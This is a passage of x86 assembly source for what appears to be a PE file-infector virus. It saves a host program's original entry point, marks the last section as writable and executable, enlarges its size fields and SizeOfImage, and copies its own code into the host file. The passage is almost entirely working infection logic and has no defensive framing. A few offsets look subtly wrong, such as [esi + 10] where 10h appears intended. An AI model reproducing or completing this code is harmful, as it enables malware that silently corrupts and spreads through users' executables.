...
prog_end:
	...
	movzx ecx, word [edx + 06h]	; Load number of sections
	mov edi, esi
	xor eax, eax
	push ecx
...
_not_biggest:
	...
	mov [ebp + dwOriginalEntryPoint], eax	; Save original Entry point
	pop ebx
	...
	movzx eax, word [edx + 14h] ; get Optional Header size
	add ecx, eax 	; ecx point to start of section table
	mov [esp + 32], ecx	; Save to stack
	
	;	Go to the starting point of prog
	add esi, ecx	; esi point to the last section in the table
	mov eax, [esi + 0xc]	; eax = VirtualAddress (RVA)
	add eax, [esi + 0x8]	; eax = VirtualAddress of last section + original virtual size = the last position of the file (EOF)
	mov [esp + 36], esi		; it is also new entry point
	mov ecx, edx			; ecx = mapping address base
	add ecx, [esi + 0x14]	; Mapping address + [esi + 0x14] = map address + pointerToRawData (RVA) = pointertoRawData (VA) (VA of last section)
	add ecx, [esi + 8]		; pointerToRawData (VA of last section) + old VirtualSize = starting point of prog code in Mapping memory
	or dword [esi + 0x24], 00000020h | 20000000h | 80000000h | 80h	;	set last section flag
	
	;	Adjust meta data in section table
	add dword [esi + 8], prog_sz	;	increase virtual size of the last section by the prog_sz
	mov eax, dword [esi + 8]		;	new virtual size = old virtual size + prog_size
	mov dword [edx + 0x50], eax		;	Modify SizeOfImage
	mov eax, dword [esi + 0xC]		;	Old virtual address of last section
	add dword [edx + 0x50], eax		;	Update SizeOfImage (has not aligned)
	mov eax, dword [edx + 0x50]
	mov ecx, edx					;	Save PE header
	xor edx, edx
	div dword [ecx + 38h]			;	eax / [ecx + 38h] = new SizeOfImage / section Alignment
	mov eax, [ecx + 38h]
	sub eax, edx					;	section alignment - remainder
	add dword [ecx + 50h], eax		;	set New SizeOfImage (aligned by sectionAlignment)
	xor edx, edx
	mov eax, dword [esi + 8]		;	eax = new virtual size = old virtual size + prog_sz
	div dword [ecx + 0x3c]			;	new virtual size / FileAlignment, edx = remainder
	mov eax, dword [ecx + 0x3c]		;	eax = FileAlignment
	sub eax, edx					;	FileAlignment - remainder
	push ecx						;	Save PE header
	mov ecx, dword [esi + 8]		;	ecx = new virtualsize = old virtual size + prog_sz
	mov dword [esi + 10h], ecx		;	set new SizeOfRawData = new virtual size
	add dword [esi + 10h], eax		;	new SizeOdRawData = new virtual size + FileAlignment - remainder = new SizeOfRawData aligned by FileAlignment
	mov ecx, dword [esi + 10]
	mov [esp + 64 + 4], ecx			;	Save new SizeOfRawData to stack
	mov ecx, [esi + 14h]			;	ecx point to PointerToRawData
	add dword [esp + 64 + 4], ecx	;	[esp + 64] = PointerToRawData + new SizeOfRawData
	pop ecx							;	Restore ecx header
	mov eax, [ecx + 34h]			;	Get ImageBase
	;	Save ImageBase to Stack
	mov eax, [ecx + 28h]			;	get orginal entry point
	;mov [ebx - global_count + 4], eax	; Save original entry point to global variable
	lea esi, [ebp + prog_start]
	mov ecx, prog_sz
	cld
	rep movsb
